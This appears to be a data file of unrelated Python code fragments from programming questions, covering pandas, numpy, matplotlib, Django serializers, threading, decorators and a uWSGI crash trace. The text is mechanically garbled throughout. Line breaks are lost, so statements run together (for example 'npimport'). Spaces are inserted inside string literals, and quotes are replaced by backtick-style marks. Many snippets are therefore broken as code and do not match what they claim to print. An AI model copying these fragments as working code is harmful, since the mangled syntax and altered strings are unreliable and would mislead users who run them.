) > > > res = minimize ( choiceProbDev , sparams , ( stim , dflt , dat , N ) , method='Nelder-Mead ' ) [ -0.5 -0.5 -0.5 4 . ] [ -0.525 -0.5 -0.5 4 . ] [ -0.5 -0.525 -0.5 4 . ] [ -0.5 -0.5 -0.525 4 . ] [ -0.5 -0.5 -0.5 4.2 ] [ -0.5125 -0.5125 -0.5125 3.8 ] ... > res < - optim ( sparams , choiceProbDev , stim=stim , dflt=dflt , dat=dat , N=N , method= '' Nelder-Mead '' ) [ 1 ] -0.5 -0.5 -0.5 4.0 [ 1 ] -0.1 -0.5 -0.5 4.0 [ 1 ] -0.5 -0.1 -0.5 4.0 [ 1 ] -0.5 -0.5 -0.1 4.0 [ 1 ] -0.5 -0.5 -0.5 4.4 [ 1 ] -0.3 -0.3 -0.3 3.6 ..."
"import numpy as npimport matplotlib as mplimport matplotlib.pyplot as pltimport seaborn as sns % matplotlib inlinedata = np.random.randn ( 100 ) fig , ax = plt.subplots ( figsize = ( 11,8.5 ) ) ax.plot ( data )"
< place x= '' 1.3cm '' y= '' 0cm '' height= '' 1.55cm '' width= '' 19.0cm '' > < para style= '' main_footer '' > [ [ company.rml_footer ] ] < /para > < para style= '' main_footer '' > Page : < pageNumber/ > / < pageCount/ > < /para > < /place >
"\begin { tabular } { llllrrr } \toprule & & & 1 & 2 & 3 \\\midrulea & 1 & 1.0 & 1898 & 1681 & 1.129090 \\ & & 0.1 & 1898 & 1349 & 1.406968 \\ & 10 & 1.0 & 8965 & 5193 & 1.726362 \\ & & 0.1 & 8965 & 1669 & 5.371480 \\ & 100 & 1.0 & 47162 & 22049 & 2.138963 \\ & & 0.1 & 47162 & 5732 & 8.227844 \\b & 1 & 1.0 & 8316 & 7200 & 1.155000 \\ & & 0.1 & 8316 & 5458 & 1.523635 \\ & 10 & 1.0 & 43727 & 24654 & 1.773627 \\ & & 0.1 & 43727 & 6945 & 6.296184 \\ & 100 & 1.0 & 284637 & 137391 & 2.071730 \\ & & 0.1 & 284637 & 26364 & 10.796427 \\\bottomrule\end { tabular } df = pd.read_csv ( 'test.out ' , sep= ' & ' , header=None , index_col= ( 0,1,2 ) , skiprows=4 , skipfooter=3 , engine='python ' ) In [ 4 ] : df.indexOut [ 4 ] : MultiIndex ( levels= [ [ u ' ' , u ' a ' , u ' b ' ] , [ u ' ' , u ' 1 ' , u ' 10 ' , u ' 100 ' ] , [ 0.1 , 1.0 ] ] , labels= [ [ 1 , 0 , 0 , 0 , 0 , 0 , 2 , 0 , 0 , 0 , 0 , 0 ] , [ 1 , 0 , 2 , 0 , 3 , 0 , 1 , 0 , 2 , 0 , 3 , 0 ] , [ 1 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 0 ] ] , names= [ 0 , 1 , 2 ] )"
"ListSerializer is not JSON serializable . ProductoSerializer ( products , many=True ) class UserSerializer ( serializers.HyperlinkedModelSerializer ) : ciudad = serializers.SerializerMethodField ( ) conectado = serializers.SerializerMethodField ( ) class Meta : model = Usuario fields = ( 'uid ' , 'nombre ' , 'ciudad ' , 'conectado ' ) def get_ciudad ( self , obj ) : geolocator = Nominatim ( user_agent= '' bookalo '' ) location = geolocator.reverse ( str ( obj.latitud_registro ) + ' , ' + str ( obj.longitud_registro ) ) return location.raw [ 'address ' ] [ 'city ' ] def get_conectado ( self , obj ) : ahora = timezone.now ( ) result = relativedelta ( ahora , obj.ultima_conexion ) return result.days == 0 and result.hours == 0 and result.months == 0 and result.years == 0 and result.minutes < 5class TagSerializer ( serializers.HyperlinkedModelSerializer ) : class Meta : model = Tag fields = ( 'nombre ' ) class MultimediaSerializer ( serializers.HyperlinkedModelSerializer ) : contenido_url = serializers.SerializerMethodField ( ) class Meta : model = ContenidoMultimedia fields = ( 'contenido_url ' , 'orden_en_producto ' ) def get_contenido_url ( self , obj ) : return obj.contenido.urlclass MiniProductoSerializer ( serializers.HyperlinkedModelSerializer ) : contenido_multimedia = serializers.SerializerMethodField ( ) class Meta : model = Producto fields = ( 'nombre ' , 'precio ' , 'estado_venta ' , 'contenido_multimedia ' ) def get_contenido_multimedia ( self , obj ) : contenido = ContenidoMultimedia.objects.get ( producto=obj.pk , orden_en_producto=0 ) return MultimediaSerializer ( contenido ) class ProductoSerializer ( serializers.HyperlinkedModelSerializer ) : vendido_por = UserSerializer ( read_only=True ) tiene_tags = TagSerializer ( many=True , read_only=True ) contenido_multimedia = serializers.SerializerMethodField ( ) valoracion_media_usuario = serializers.SerializerMethodField ( ) class Meta : model = Producto fields = ( 'nombre ' , 'precio ' , 'estado_producto ' , 'estado_venta ' , 'latitud ' , 'longitud ' , 'tipo_envio ' , 'descripcion ' , 'vendido_por ' , 'tiene_tags ' , 'num_likes ' , 'contenido_multimedia ' ) def get_contenido_multimedia ( self , obj ) : contenido = ContenidoMultimedia.objects.filter ( producto=obj.pk ) .order_by ( 'orden_en_producto ' ) return MultimediaSerializer ( contenido , many=True ) def get_valoracion_media_usuario ( self , obj ) : return Usuario.objects.get ( pk=obj.vendido_por ) .media_valoracionesclass ValidacionEstrellaSerializer ( serializers.HyperlinkedModelSerializer ) : usuario_que_valora = UserSerializer ( read_only=True ) producto_asociado = serializers.SerializerMethodField ( ) class Meta : model = ValidacionEstrella fields = ( 'estrellas ' , 'comentario ' , 'timestamp ' , 'usuario_que_valora ' , 'producto_asociado ' ) def get_producto_asociado ( self , obj ) : producto = Producto.objects.get ( pk=obj.producto ) return MiniProductoSerializer ( producto ) class UserProfileSerializer ( serializers.HyperlinkedModelSerializer ) : usuario_valorado_estrella = serializers.SerializerMethodField ( ) productos_favoritos = serializers.SerializerMethodField ( ) class Meta : model = Usuario fields = ( 'uid ' , 'nombre ' , 'esta_baneado ' , 'usuario_valorado_estrella ' , 'producto_del_usuario ' ) def get_usuario_valorado_estrella ( self , obj ) : validaciones = ValidacionEstrella.objects.filter ( usuario_valorado=obj.pk ) .order_by ( '-timestamp ' ) return ValidacionEstrellaSerializer ( validaciones , many=True , read_only=True ) def get_productos_favoritos ( self , obj ) : favoritos = Producto.objects.filter ( le_gusta_a__in= [ obj.pk ] ) return ProductoSerializer ( favoritos , many=True , read_only=True ) class ReportSerializer ( serializers.HyperlinkedModelSerializer ) : # usuario_reportado = serializers.SerializerMethodField ( ) usuario_reportado = UserSerializer ( read_only=True ) class Meta : model = Report fields = ( 'usuario_reportado ' , 'causa ' ) @ api_view ( [ 'POST ' ] ) @ permission_classes ( ( permissions.AllowAny , ) ) def SearchProduct ( request , format=None ) : if request.method ! = 'POST ' : return Response ( status=status.HTTP_400_BAD_REQUEST ) preposiciones = [ ' a ' , 'ante ' , 'bajo ' , 'cabe ' , 'con ' , 'contra ' , 'de ' , 'desde ' , 'en ' , 'entre ' , 'hacia ' , 'hasta ' , 'para ' , 'por ' , 'segun ' , 'sin ' , 'so ' , 'sobre ' , 'tras ' ] try : search = request.POST.get ( 'busqueda ' ) except : return Response ( status=status.HTTP_404_NOT_FOUND ) products = Producto.objects.none ( ) for word in search.split ( ) : if word not in preposiciones : productos_palabra = Producto.objects.filter ( nombre__contains=word ) products = products | productos_palabra products.distinct ( ) product_list = [ ] for prod in products : product_list.append ( ProductoSerializer ( prod ) .data ) return Response ( { 'productos ' : product_list } , status=status.HTTP_200_OK )"
"import matplotlib.pyplot as pltimport cartopy.crs as ccrsax = plt.axes ( projection=ccrs.Robinson ( ) ) ax.set_global ( ) ax.coastlines ( ) plt.plot ( [ -0.08 , 132 ] , [ 51.53 , 43.17 ] , color='red ' , transform=ccrs.Geodetic ( ) ) plt.plot ( [ -0.08 , 132 ] , [ 51.53 , 43.17 ] , color='blue ' , transform=ccrs.PlateCarree ( ) ) plt.show ( ) import matplotlib.pyplot as pltimport cartopy.crs as ccrsax = plt.axes ( projection=ccrs.Robinson ( ) ) ax.set_extent ( [ -5 , 55 , 40 , 55 ] ) ax.coastlines ( ) plt.plot ( [ -0.08 , 50 ] , [ 51.53 , 43.17 ] , color='red ' , transform=ccrs.Geodetic ( ) ) plt.plot ( [ -0.08 , 50 ] , [ 51.53 , 43.17 ] , color='blue ' , transform=ccrs.PlateCarree ( ) ) plt.show ( )"
> > > import math > > > print ( math.pi ) 3.141592653589793 > > > import sys > > > sys.float_info.dig 15
"import numpy as npimport matplotlib.pyplot as plta = 0.2resolution = 100xarray = np.linspace ( 0,0.25 , num=resolution ) yarray = np.linspace ( 0,1 , num=resolution ) A = np.empty ( [ resolution , resolution ] ) xc = 0yc = 0for x in xarray : for y in yarray : # print xc , yc wp = 1./np.pi*np.arctan ( np.sin ( np.pi*y ) *np.sinh ( np.pi*a/2 . ) / ( np.cosh ( np.pi*x ) -np.cos ( np.pi*y ) *np.cosh ( np.pi*a/2 . ) ) ) if wp < = 0 : wp = wp+1 A [ xc , yc ] = wp else : A [ xc , yc ] = wp yc += 1 yc=0 xc += 1A = A.transpose ( ) B = np.fliplr ( A ) AB = np.hstack ( ( B , A ) ) fullx = np.hstack ( ( -xarray [ : :-1 ] , xarray ) ) # plotfig = plt.figure ( ) fig.suptitle ( `` Weighting potential '' ) ax = plt.subplot ( 1,1,1 ) CS = plt.contour ( fullx , yarray , AB,10 , colors= ' k ' ) labelpos = np.dstack ( ( np.zeros ( 9 ) , np.arange ( 0.1,1,0.1 ) ) ) [ 0 ] plt.clabel ( CS , inline=True , fmt= ' % 1.1f ' , fontsize=9 , manual=labelpos ) plt.show ( )"
"class LineItem : def __init__ ( self , description , weight , price ) : self.description = description self.weight = weight # < 1 > self.price = price def subtotal ( self ) : return self.weight * self.price @ property # < 2 > def weight ( self ) : # < 3 > return self.__weight # < 4 > @ weight.setter # < 5 > def weight ( self , value ) : if value > 0 : self.__weight = value # < 6 > else : raise ValueError ( 'value must be > 0 ' ) # < 7 >"
"class Test ( object ) : def __init__ ( self ) : self.i = random.randint ( 1,10 ) res = set ( ) for i in range ( 0,1000 ) : res.add ( Test ( ) ) print len ( res ) = 1000 class Test ( object ) : def __init__ ( self , i ) : self.i = i # self.i = random.randint ( 1,10 ) # self.j = random.randint ( 1,20 ) def __keys ( self ) : t = ( ) for key in self.__dict__ : t = t + ( self.__dict__ [ key ] , ) return t def __eq__ ( self , other ) : return isinstance ( other , Test ) and self.__keys ( ) == other.__keys ( ) def __hash__ ( self ) : return hash ( self.__keys ( ) ) res = set ( ) res.add ( Test ( 2 ) ) ... res.add ( Test ( 8 ) )"
"df=pd.DataFrame ( { ' a ' : [ 1,2,3,0 ] } ) print ( df.replace ( 0 , [ ] ) ) TypeError : Invalid `` to_replace '' type : 'int ' df [ df==0 ] = [ ] a0 11 22 33 [ ]"
/trainingSet image1.jpg image2.jpg . . ./googleImages_noFaces image1.jpg image2.jpg . . ./cascadeFilesmaleDesc.txtbgDesc.txt opencv_createsamples -vec maleDesc.vec -info maleDesc.txt -bg bgDesc.txt -num 70 -w 24 -h 24 opencv_traincascade -data cascadeFiles -vec maleDesc.vec -bg bgDesc.txt -numPos 70 - numNeg 293 -numStages 1 -precalcValBufSize 500 -precalcIdxBufSize 500 -featureType LBP -w 24 -h 24
"a = [ [ 25,26,1,2,23 ] , [ 15,16,11,12,10 ] ] newA = [ ] for lst in a : new_nums = [ lst [ 4 ] , lst [ 2 ] , lst [ 3 ] , lst [ 0 ] , lst [ 1 ] ] newA.append ( new_nums ) print ( newA ) # prints -- > [ [ 23 , 1 , 2 , 25 , 26 ] , [ 10 , 11 , 12 , 15 , 16 ] ]"
"# Wait for thread count to reduce before continuingwhile threading.active_count ( ) > = self.max_threads : pass import socketimport sysimport urllib , urllib2import threadingimport cPicklefrom supply import supplyclass supply_thread ( threading.Thread ) : def __init__ ( self , _sock ) : threading.Thread.__init__ ( self ) self.__socket = _sock def run ( self ) : data = self.readline ( ) self.__socket.close ( ) new_supply = supply.supply ( data ) new_supply.run ( ) def readline ( self ) : `` '' '' read data sent from webserver and decode it `` '' '' data = self.__socket.recv ( 1024 ) if data : data = cPickle.loads ( data ) return dataclass server : def __init__ ( self ) : # # Socket Vars self.__socket = None self.HOST = `` self.PORT = 50007 self.name = socket.gethostname ( ) self.max_jobs = 3 def listen ( self ) : `` '' '' Listen for a connection from the webserver `` '' '' self.__socket = socket.socket ( socket.AF_INET , socket.SOCK_STREAM ) # Allows quick connection from the same address self.__socket.setsockopt ( socket.SOL_SOCKET , socket.SO_REUSEADDR , 1 ) self.__socket.bind ( ( self.HOST , self.PORT ) ) return self.__socket.listen ( 1 ) def connect ( self ) : webserver = self.__socket.accept ( ) [ 0 ] print 'Connected by ' , webserver new_thread = supply_thread ( webserver ) print 'Starting thread ' , new_thread.getName ( ) new_thread.start ( ) def close ( self ) : return self.__socket.close ( ) def run ( self ) : import time while True : print ( sys.version ) # Wait for connection from Webserver self.listen ( ) time.sleep ( 3 ) # Let the Webserver know I 'm avilable self.status ( status='Available ' ) print 'Waiting for connection ... ' self.connect ( ) print 'thread count : ' , threading.enumerate ( ) print 'thread count : ' , threading.active_count ( ) while threading.active_count ( ) > = self.max_jobs : pass def status ( self , status='Available ' ) : computer_name = socket.gethostname ( ) svcURL = `` http : //localhost:8000/init/default/server '' params = { 'computer_name ' : computer_name , 'status ' : status , 'max_jobs ' : self.max_jobs } svcHandle = urllib2.urlopen ( svcURL , urllib.urlencode ( params ) )"
i = 0lock = threading.RLock ( ) def do_work ( ) : global i # global lock ? ? ? ? ? ? ? ? ? ? ? ? ? while i < len ( my_list ) : lock.acquire ( ) my_i = i i += 1 lock.release ( ) my_list [ my_i ] .some_works ( ) workers = [ threading.Thread ( target=do_work ) for _ in range ( 8 ) ] for worker in workers : worker.start ( )
"class MyClass : var = 'hello ' def __init__ ( self ) : print ( self.var ) class MyClass : def __init__ ( self , var ) : self.var = var print ( self.var ) class MyClass : var : str = 'hello ' def __init__ ( self , var : str = None ) : self.var = var if var print ( self.var )"
In [ 84 ] : dfOut [ 84 ] : a b maxsince2007-04-27 11:00:00 1 True 12007-04-27 11:30:00 5 False 52007-04-27 12:00:00 3 False 52007-04-27 12:30:00 2 True 22007-04-27 13:00:00 2 False 22007-04-27 13:30:00 7 True 72007-04-27 14:00:00 3 False 72007-04-27 14:30:00 4 False 7
"In [ 1 ] : one_million_ones = np.ones ( 10**6 ) In [ 2 ] : % timeit one_million_ones.any ( ) 100 loops , best of 3 : 693µs per loopIn [ 3 ] : ten_millions_ones = np.ones ( 10**7 ) In [ 4 ] : % timeit ten_millions_ones.any ( ) 10 loops , best of 3 : 7.03 ms per loop"
"uwsgi -- http :8080 -- http-websockets -- wsgi-file websocket.py -- venv ../../python2-wow ! ! ! uWSGI process 29129 got Segmentation Fault ! ! ! *** backtrace of 29129 ***0 uwsgi 0x00000001078b5ec0 uwsgi_backtrace + 481 uwsgi 0x00000001078b6371 uwsgi_segfault + 492 libsystem_platform.dylib 0x00007fff96b2c5aa _sigtramp + 263 ? ? ? 0x0000000000000000 0x0 + 04 uwsgi 0x0000000107897b4e async_add_fd_read + 2065 uwsgi 0x00000001078c8979 py_eventfd_read + 896 Python 0x00000001079d214d PyEval_EvalFrameEx + 80807 Python 0x00000001079d0093 PyEval_EvalCodeEx + 16418 Python 0x0000000107977796 PyFunction_SetClosure + 8099 Python 0x0000000107959f72 PyObject_Call + 10110 Python 0x00000001079d601f PyEval_CallObjectWithKeywords + 9311 uwsgi 0x00000001078c6dc7 python_call + 2312 uwsgi 0x00000001078c8df9 uwsgi_request_wsgi + 88913 uwsgi 0x000000010787b7e3 wsgi_req_recv + 29114 uwsgi 0x00000001078b38a5 simple_loop_run + 22915 uwsgi 0x00000001078ba6e2 uwsgi_ignition + 22616 uwsgi 0x00000001078ba5ae uwsgi_worker_run + 67017 uwsgi 0x00000001078b9d26 uwsgi_start + 507818 uwsgi 0x00000001078b81a3 main + 733119 libdyld.dylib 0x00007fff8c6ce5fd start + 1*** end of backtrace *** uwsgi.wait_fd_read ( websocket_fd , 3 )"
"import sqlalchemy as sadef DuplicateObject ( oldObj ) : mapper = sa.inspect ( type ( oldObj ) ) newObj = type ( oldObj ) ( ) for col in mapper.columns : # no PrimaryKey not Unique if not col.primary_key and not col.unique : setattr ( newObj , col.key , getattr ( oldObj , col.key ) ) return newObj"
"pd.DataFrame ( { 'Column1 ' : [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 ] , 'Column2 ' : [ 4 , 3 , 6 , 8 , 3 , 4 , 1 , 4 , 3 ] , 'Column3 ' : [ 7 , 3 , 3 , 1 , 2 , 2 , 3 , 2 , 7 ] , 'Column4 ' : [ 9 , 8 , 7 , 6 , 5 , 4 , 3 , 2 , 1 ] , 'Column5 ' : [ 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 ] } ) Column1 Column2 many-to-oneColumn1 Column3 many-to-oneColumn1 Column4 one-to-oneColumn1 Column5 many-to-oneColumn2 Column3 many-to-many ... Column4 Column5 many-to-one"
"def revFinder ( str1 , str2 ) : dmp = dmp_module.diff_match_patch ( ) diffs = dmp.diff_main ( str1 , str2 ) paratext = [ ] for diff in diffs : paratext.append ( ( diff [ 1 ] , `` if diff [ 0 ] == 0 else ( 's ' if diff [ 0 ] == -1 else ' b ' ) ) ) return paratext [ ( `` Hello , `` , `` ) , ( `` my name `` , ' b ' ) , ( `` is Brad '' , 's ' ) ] [ ( fieldName , original , revised ) ] Orignial fieldName ( With Markup ) result of revFinder diffing orignal and revisedRevised fieldName revised if len ( item [ 1 ] .split ( '\n ' ) ) + len ( item [ 1 ] .split ( '\n ' ) ) ) == 2 : body.append ( heading ( `` Original { } ( With Markup ) '' .format ( item [ 0 ] ) ,2 ) ) body.append ( paragraph ( revFinder ( item [ 1 ] , item [ 2 ] ) ) ) body.append ( paragraph ( `` '' , style= '' BodyTextKeep '' ) ) body.append ( heading ( `` Revised { } '' .format ( item [ 0 ] ) ,2 ) ) body.append ( paragraph ( item [ 2 ] ) ) body.append ( paragraph ( `` '' ) ) else : diff = len ( item [ 1 ] .split ( '\n ' ) ) - len ( item [ 1 ] .split ( '\n ' ) ) if diff == 0 : body.append ( heading ( `` Original { } ( With Markup ) '' .format ( item [ 0 ] ) ,2 ) ) for orPara , revPara in zip ( item [ 1 ] .split ( '\n ' ) , item [ 2 ] .split ( '\n ' ) ) : body.append ( paragraph ( revFinder ( orPara , revPara ) ) ) body.append ( paragraph ( `` '' , style= '' BodyTextKeep '' ) ) body.append ( heading ( `` Revised { } '' .format ( item [ 0 ] ) ,2 ) ) for para in item [ 2 ] .split ( '\n ' ) : body.append ( paragraph ( `` { } '' .format ( para ) ) ) body.append ( paragraph ( `` '' ) ) elif diff > 0 : # Removed paragraphs elif diff < 0 : # Added paragraphs { `` Unique ID Number '' : [ list of CR info ] }"
"dic = { 'S1 ' : [ `` 2013-11-12 '' , `` 2013-11-13 '' ] , 'S2 ' : [ `` 2013-11-15 '' , `` 2013-11-17 '' ] } S1 S2 Start Stop Start Stop 2013-11-12 2013-11-13 2013-11-15 2013-11-17"
$ python3 -c `` print ( '\x30\xA0\x04\x08 ' ) '' | xxd0000000 : 30c2 a004 080a $ python2 -c `` print ( '\x30\xA0\x04\x08 ' ) '' | xxd0000000 : 30a0 0408 0a
"User.objects.filter ( charfield_2__startswith=Substr ( 'charfield_1 ' , 1 , 3 ) ) django.db.utils.DataError : invalid input syntax for integer : `` 1 % '' LINE 1 : ... CE ( REPLACE ( ( SUBSTRING ( `` model_name '' . `` charfield_2 '' , ' 1 % ' , 3 ) ) , ..."
"import pandas as pdimport numpy as npdf = pd.DataFrame ( { ' x ' : [ ' a ' , ' b ' , ' c ' ] , ' y ' : [ 1 , 2 , 2 ] , ' z ' : [ ' f ' , 's ' , 's ' ] } ) .set_index ( ' x ' ) selection = [ ' a ' , ' c ' , ' b ' , ' b ' , ' c ' , ' a ' ] out = df.loc [ selection ]"
"l = [ ( 100 , 230 ) , ( 10 , 12 ) , ( 7,1320 ) , ... ] id | value -- -- | -- -- -- 1 | 1202 | 23 | 94 | 12455 | 4512 q = session.query ( Table.value ) for f in l : q = q.filter ( ( Table.value.between ( f [ 0 ] , f [ 1 ] ) ) )"
def makebold ( fn ) : def wrapped ( ) : return `` < b > '' + fn ( ) + `` < /b > '' return wrappeddef makeitalic ( fn ) : def wrapped ( ) : return `` < i > '' + fn ( ) + `` < /i > '' return wrapped @ makebold @ makeitalicdef hello ( ) : return `` hello world '' print hello ( ) # # returns < b > < i > hello world < /i > < /b > def makebold ( fn ) : def wrapped ( ) : return `` < b > '' + fn ( ) + `` < /b > '' return wrapped @ makebolddef makeitalic ( fn ) : def wrapped ( ) : return `` < i > '' + fn ( ) + `` < /i > '' return wrapped @ makeitalicdef hello ( ) : return `` hello world '' print hello ( ) # # TypeError : wrapped ( ) takes no arguments ( 1 given )
"> > > def foo ( a : int ) : ... b : int = c : int = a File `` < stdin > '' , line 2 b : int = c : int = a ^SyntaxError : invalid syntax > > > def foo ( a : int ) : ... b = c : int = a File `` < stdin > '' , line 2 b = c : int = a ^SyntaxError : invalid syntax > > > from typing import Tuple > > > def bar ( a : Tuple [ int ] ) : ... b : int , c : int = a File `` < stdin > '' , line 2 b : int , c : int = a ^SyntaxError : invalid syntax > > > def bar ( a : Tuple [ int ] ) : ... b , c : Tuple [ int ] = a ... File `` < stdin > '' , line 2SyntaxError : only single target ( not tuple ) can be annotated > > > def bar ( a : Tuple [ int ] ) : ... b , c : int = a ... File `` < stdin > '' , line 2SyntaxError : only single target ( not tuple ) can be annotated"
from distutils.core import setupimport py2exesetup ( console= [ 'orderer.py ' ] ) msvcr90.dllkernel32.dll +ntdll.dll $ grep -lir msvcrt.dll ../buildout./buildtest.py./dist/ACTIVEDS.dll./dist/adsldpc.dll./dist/ATL.DLL./dist/credui.dll./dist/DSOUND.dll./dist/MAPI32.dll./dist/PROPSYS.dll./dist/WLDAP32.dll
col1 col2 1 A 4 B 5 X df [ 'col1 ' ] = df [ 'col1 ' ] .apply ( square )
"def example1 ( array ) : for row in array : row = row + 1 return arraydef example2 ( array ) : for row in array : row += 1 return arraydef example3 ( array ) : for row in array : row [ : ] = row + 1 return array ex1 = np.arange ( 9 ) .reshape ( 3 , 3 ) ex2 = ex1.copy ( ) ex3 = ex1.copy ( ) > > > example1 ( ex1 ) array ( [ [ 0 , 1 , 2 ] , [ 3 , 4 , 5 ] , [ 6 , 7 , 8 ] ] ) > > > example2 ( ex2 ) array ( [ [ 1 , 2 , 3 ] , [ 4 , 5 , 6 ] , [ 7 , 8 , 9 ] ] ) > > > example3 ( ex3 ) array ( [ [ 1 , 2 , 3 ] , [ 4 , 5 , 6 ] , [ 7 , 8 , 9 ] ] )"
"df = pd.DataFrame ( { `` a '' : pd.Categorical ( [ `` foo '' , `` foo '' , `` bar '' ] ) , `` b '' : [ 1 , 2 , 1 ] } ) df2 = pd.DataFrame ( { `` a '' : pd.Categorical ( [ `` baz '' ] ) , `` b '' : [ 1 ] } ) df [ `` a '' ] = df [ `` a '' ] .cat.add_categories ( `` baz '' ) df2 [ `` a '' ] = df2 [ `` a '' ] .cat.add_categories ( [ `` foo '' , `` bar '' ] ) In [ 33 ] : df.a.cat.categoriesOut [ 33 ] : Index ( [ 'bar ' , 'foo ' , 'baz ' ] , dtype='object ' ) In [ 34 ] : df2.a.cat.categoriesOut [ 34 ] : Index ( [ 'baz ' , 'foo ' , 'bar ' ] , dtype='object ' ) In [ 35 ] : pd.concat ( [ df , df2 ] ) .info ( ) < class 'pandas.core.frame.DataFrame ' > Int64Index : 4 entries , 0 to 0Data columns ( total 2 columns ) : a 4 non-null objectb 4 non-null int64dtypes : int64 ( 1 ) , object ( 1 ) memory usage : 96.0+ bytes"
| student_name | subject | test_number | score | | -- -- -- -- -- -- -- | -- -- -- -- -| -- -- -- -- -- -- -| -- -- -- -|| sarah | maths | test1 | 78 || sarah | maths | test2 | 71 || sarah | maths | test3 | 83 || sarah | physics | test1 | 91 || sarah | physics | test2 | 97 || sarah | history | test1 | 83 || sarah | history | test2 | 87 || joan | maths | test1 | 83 || joan | maths | test2 | 88 | | student_name | subject | test_number | score | | -- -- -- -- -- -- -- | -- -- -- -- -| -- -- -- -- -- -- -| -- -- -- -|| sarah | maths | test1 | 78 || sarah | maths | test2 | 71 || sarah | maths | test3 | 83 || sarah | physics | test1 | 91 | | student_name | subject | test_number | ave_score | | -- -- -- -- -- -- -- | -- -- -- -- -| -- -- -- -- -- -- -| -- -- -- -- -- -|| sarah | maths | na | 77.333 || sarah | maths | na | 94 || sarah | maths | na | 85 || sarah | physics | na | 85.5 | | query | target | pct-similarity | p-val | aln_length | bit-score || -- -- -- -| -- -- -- -- -- | -- -- -- -- -- -- -- -- | -- -- -- -| -- -- -- -- -- -- | -- -- -- -- -- -|| EV239 | B/Fw6/623 | 99.23 | 0.966 | 832 | 356 || EV239 | B/Fw6/623 | 97.34 | 0.982 | 1022 | 739 || EV239 | MMS-alpha | 92.23 | 0.997 | 838 | 384 || EV239 | MMS-alpha | 93.49 | 0.993 | 1402 | 829 || EV380 | B/Fw6/623 | 94.32 | 0.951 | 324 | 423 || EV380 | B/Fw6/623 | 95.27 | 0.932 | 1245 | 938 || EV380 | MMS-alpha | 99.23 | 0.927 | 723 | 522 || EV380 | MMS-alpha | 99.15 | 0.903 | 948 | 1092 |
"$ cat call.c # include < Python.h > int main ( int argc , char *argv [ ] ) { Py_InitializeEx ( 0 ) ; PySys_SetArgv ( argc-1 , argv+1 ) ; if ( PyRun_AnyFileEx ( fopen ( argv [ 1 ] , `` r '' ) , argv [ 1 ] , 1 ) ! = 0 ) { PyObject *exc = PyErr_Occurred ( ) ; printf ( `` terminated by % s\n '' , PyErr_GivenExceptionMatches ( exc , PyExc_SystemExit ) ? `` exit ( ) '' : `` exception '' ) ; } Py_Finalize ( ) ; return 0 ; } $ cat unittest-files/python-return-code.py from sys import exitexit ( 99 ) $ ./call unittest-files/python-return-code.py $ echo $ ? 99"
"class A ( object ) : def __init__ ( self ) : print `` A '' super ( A , self ) .__init__ ( ) class B ( object ) : def __init__ ( self ) : print `` B '' super ( B , self ) .__init__ ( ) class C ( A , B ) : def __init__ ( self ) : print `` C '' A.__init__ ( self ) B.__init__ ( self ) print `` MRO : '' , [ x.__name__ for x in C.__mro__ ] # prints MRO : [ ' C ' , ' A ' , ' B ' , 'object ' ] C ( ) # prints C A B B"
/mysite /mysite __init.py settings.py urls.py wsgi.py /mymodel ... /myapp ... manage.py ImportError : Could not import settings 'mysite.mysite.settings ' ( Is it on sys.path ? Is there an import error in the settings file ? ) : No module named mysite.mysite.settings
"def calculateCorrelation ( user , item ) : return calculateCorrelationAverage ( u.tags , i.tags ) def calculateCorrelationAverage ( tags1 , tags2 ) : correlationSum = 0.0 for ( tag1 , tag2 ) in allCombinations ( tags1 , tags2 ) : correlationSum += correlation ( tag1 , tag2 ) return correlationSum / ( len ( tags1 ) + len ( tags2 ) ) def allCombinations ( list1 , list2 ) : combinations = [ ] for x in list1 : for y in list2 : combinations.append ( ( x , y ) ) return combinations"
"Python 3.6.5 ( default , Mar 30 2018 , 06:41:53 ) [ GCC 4.2.1 Compatible Apple LLVM 9.0.0 ( clang-900.0.39.2 ) ] on darwinType `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > a = 'string ' > > > b = a > > > b is aTrue > > > b = 'string ' > > > b is aTrue > > > a = ' 1,2,3,4 ' > > > b = a > > > b is aTrue > > > b = ' 1,2,3,4 ' > > > b is aFalse"
"import numpy as npdt = np.dtype ( [ ( 'tuple ' , ( int , 2 ) ) ] ) a = np.zeros ( 3 , dt ) type ( a [ 'tuple ' ] [ 0 ] ) # ndarraytype ( a [ 0 ] [ 'tuple ' ] ) # ndarraya [ 'tuple ' ] [ 0 ] = ( 1,2 ) # oka [ 0 ] [ 'tuple ' ] = ( 1,2 ) # ValueError : shape-mismatch on array construction"
"ID , SEQ500 , HNL , LNH , MLH , HML ( HNL , LNH ) , ( LNH , MLH ) , etc.. { 500 : { HNLLNH : 0.333 } , { LNHMLH : 0.333 } , { MLHHML : 0.333 } , { LNHHNL : 0.000 } , etc.. } [ HNLLNH ] , [ LNHMLH ] , [ MHLHML ] , etc.. def f ( x ) : # Custom RDD map function # Combines two separate transactions # into a single transition state cust_id = x [ 0 ] trans = ' , '.join ( x [ 1 ] ) y = trans.split ( `` , '' ) s = `` for i in range ( len ( y ) -1 ) : s= s + str ( y [ i ] + str ( y [ i+1 ] ) ) + '' , '' return str ( cust_id+ ' , '+s [ : -1 ] ) def g ( x ) : # Custom RDD map function # Calculates the transition state probabilities # by adding up state-transition occurrences # and dividing by total transitions cust_id=str ( x.split ( `` , '' ) [ 0 ] ) trans = x.split ( `` , '' ) [ 1 : ] temp_list= [ ] middle = int ( ( len ( trans [ 0 ] ) +1 ) /2 ) for i in trans : temp_list.append ( ( `` .join ( i ) [ : middle ] , `` .join ( i ) [ middle : ] ) ) state_trans = { } for i in temp_list : state_trans [ i ] = temp_list.count ( i ) / ( len ( temp_list ) ) my_dict = { } my_dict [ cust_id ] =state_trans return my_dictdef gen_tsm_dict_spark ( lines ) : # Takes RDD/string input with format CUST_ID ( or ) PROFILE_ID , SEQ , SEQ , SEQ ... . # Returns RDD of dict with CUST_ID and tsm per customer # i.e . { cust_id : { ( 'NLN ' , 'LNN ' ) : 0.33 , ( 'HPN ' , 'NPN ' ) : 0.66 } # creates a tuple ( [ cust/profile_id ] , [ SEQ , SEQ , SEQ ] ) cust_trans = lines.map ( lambda s : ( s.split ( `` , '' ) [ 0 ] , s.split ( `` , '' ) [ 1 : ] ) ) with_seq = cust_trans.map ( f ) full_tsm_dict = with_seq.map ( g ) return full_tsm_dictdef main ( ) : result = gen_tsm_spark ( my_rdd ) # Insert into DBfor x in result.collect ( ) : for k , v in x.iteritems ( ) : db_insert ( k , v )"
